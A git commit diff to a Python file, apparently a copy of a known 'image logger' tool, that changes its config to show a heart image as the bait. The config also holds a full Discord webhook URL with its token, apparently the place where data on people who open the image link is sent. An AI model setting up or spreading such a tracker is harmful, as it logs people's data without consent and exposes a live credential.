b7b1676a144ef3fdd0021ed5b551711c03864c30
Rowmbo <147776791+Rowmbo@users.noreply.github.com>
2025-02-06 17:01:57 +1300

    Update proposale.py

--- api/proposale.py
+++ api/proposale.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1334816427080941578/D2Un8yQSNNXi0BIG66gSY1GPsD770a1BkAIynu03hOIM6L6uZH_Wy_m0Nn9FIA_v_7TV",
-     # You can also have a custom image by using a URL argument
+    "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f1/Heart_corazón.svg/800px-Heart_corazón.svg.png" # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
